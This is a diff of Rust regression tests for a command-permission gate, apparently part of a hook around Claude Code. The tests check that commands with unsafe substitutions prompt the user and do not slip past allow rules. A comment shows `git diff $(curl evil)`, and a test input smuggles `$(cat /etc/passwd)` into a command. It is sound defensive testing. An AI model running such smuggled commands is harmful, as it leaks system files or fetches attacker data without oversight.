@@ -1203,14 +1203,16 @@ mod tests {
     }
 
     // === #2286 regression: Ask-on-no-rewrite must not be silently dropped =====
-    // Before the fix, a non-rewritable command carrying a not-evaluable
+    // Before the fix, a non-rewritable command carrying a not-attestable
     // construct fell through to `Skip` (empty stdout), so the host (Claude
     // Code) applied its own `Bash(<cmd>:*)` allow rule and auto-ran e.g.
-    // `git status $(whoami)`. These run through `run_claude_inner` — the same
+    // `git diff $(curl evil)`. These run through `run_claude_inner` — the same
     // real `check_command` + real gate path `run_claude` uses — for an
     // end-to-end proof. `notarealcmd` is unknown to the registry (no rewrite),
-    // and `contains_unattestable_construct` makes `check_command_with_rules`
-    // return Ask BEFORE any allow/default matching, so no rules need injecting.
+    // and an UNSAFE substitution (`$(cat secret)` — reads file contents) makes
+    // `check_command_with_rules` return Ask BEFORE any allow/default matching,
+    // so no rules need injecting. (A SAFE payload like `$(whoami)` is now
+    // attestable and would not Ask — see permissions.rs `substitutions_are_safe`.)
 
     /// Helper: does the live path emit an `ask` permissionDecision?
     fn live_path_asks(cmd: &str) -> bool {
@@ -1225,10 +1227,11 @@ mod tests {
 
     #[test]
     fn test_live_unattestable_non_rewritable_asks() {
-        // Non-rewritable + command substitution → Ask verdict. Must escalate
-        // to a real `ask`, NOT Skip (which leaks to the host's allow rule).
+        // Non-rewritable + UNSAFE command substitution → Ask verdict. Must
+        // escalate to a real `ask`, NOT Skip (which leaks to the host's allow
+        // rule). `$(cat …)` reads file contents → not attestable.
         assert!(
-            live_path_asks("notarealcmd $(whoami)"),
+            live_path_asks("notarealcmd $(cat /etc/passwd)"),
             "an unattestable non-rewritable command must emit ask, not skip (#2286)"
         );
     }
